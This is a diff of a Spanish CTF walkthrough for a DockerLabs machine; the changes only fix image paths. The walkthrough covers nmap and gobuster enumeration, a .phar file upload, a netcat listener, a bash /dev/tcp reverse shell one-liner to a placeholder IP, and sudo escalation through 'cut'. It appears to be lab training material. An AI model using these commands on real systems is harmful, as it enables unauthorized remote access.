@@ -15,7 +15,7 @@ Despliegue
 bash auto_deploy.sh dockerlabs.tar
 ```
 
-![](BLOG-GIT/images/Pasted%20image%2020250126152356.png)
+![](./images/Pasted%20image%2020250126152356.png)
 
 Y ahí tenemos la ip de nuestra máquina víctima: 
 
@@ -33,13 +33,13 @@ nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
 ```
 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126152705.png)
+![](./images/Pasted%20image%2020250126152705.png)
 
 Vemos el puerto 80 que está abierto. Por lo que nos vamos a la web y vemos a ver qué hay. 
 
 Vemos lo siguiente:
 
-![](BLOG-GIT/images/Pasted%20image%2020250126152828.png)
+![](./images/Pasted%20image%2020250126152828.png)
 
 Como vemos no hay nada que nos revele algo de información en la web por lo que haríamos es fuzzing web. 
 
@@ -49,7 +49,7 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 
 Usamos gobuster y nos devuelve por consola lo siguiente: 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126153330.png)
+![](./images/Pasted%20image%2020250126153330.png)
 
 Nos sale una ruta por la que posiblemente se suban archivos por otra ruta. 
 
@@ -61,25 +61,25 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 
 Y nos sale lo siguiente:
 
-![](BLOG-GIT/images/Pasted%20image%2020250126153751.png)
+![](./images/Pasted%20image%2020250126153751.png)
 
 Y aquí tenemos algo jugoso. 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126153851.png)
+![](./images/Pasted%20image%2020250126153851.png)
 
 Aquí podría subirse al directorio uploads. 
 
 Intentamos crear un payloads con msfvenom pero nos dice lo siguiente:
 
-![](BLOG-GIT/images/Pasted%20image%2020250126154611.png)
+![](./images/Pasted%20image%2020250126154611.png)
 
-![](BLOG-GIT/images/Pasted%20image%2020250126155108.png)
+![](./images/Pasted%20image%2020250126155108.png)
 
 Nos vamos al directorio /uploads
 
 Y aquí tenemos nuestro archivo .phar
 
-![](BLOG-GIT/images/Pasted%20image%2020250126155232.png)
+![](./images/Pasted%20image%2020250126155232.png)
 
 Nos ponemos a la escucha con netcat. 
 
@@ -87,11 +87,11 @@ Nos ponemos a la escucha con netcat.
 nc -nlvp 443
 ```
 
-![](BLOG-GIT/images/Pasted%20image%2020250126155423.png)
+![](./images/Pasted%20image%2020250126155423.png)
 
 y le damos al archivo. 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126155502.png)
+![](./images/Pasted%20image%2020250126155502.png)
 
 Pondremos el siguiente comando para estar más estable. Pero antes debemos de estar en la escucha por el puerto 444 o cualquier otro. 
 
@@ -99,19 +99,19 @@ Pondremos el siguiente comando para estar más estable. Pero antes debemos de es
 bash -c "bash -i >& /dev/tcp/"tu ip"/444 0>&1"
 ```
 
-![](BLOG-GIT/images/Pasted%20image%2020250126162525.png)
+![](./images/Pasted%20image%2020250126162525.png)
 
 Y ahora estamos algo más estable. 
 
 Y ahora haremos un tratamiento de la tty.
 
-![](BLOG-GIT/images/Pasted%20image%2020250126162717.png)
+![](./images/Pasted%20image%2020250126162717.png)
 
 Ya estamos algo más estable. 
 
 Para ver si podemos escalar privilegio usamos sudo -l 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126162950.png)
+![](./images/Pasted%20image%2020250126162950.png)
 
 Vemos que tenemos acceso como sudo a unos binarios. 
 
@@ -125,7 +125,7 @@ sudo cut -d "" -f1 "$LFILE"
 nos vamos al directorio /opt
 Y ejecutamos el comando: 
 
-![](BLOG-GIT/images/Pasted%20image%2020250126163711.png)
+![](./images/Pasted%20image%2020250126163711.png)
 
 Hemos obtenido la clave. 
 
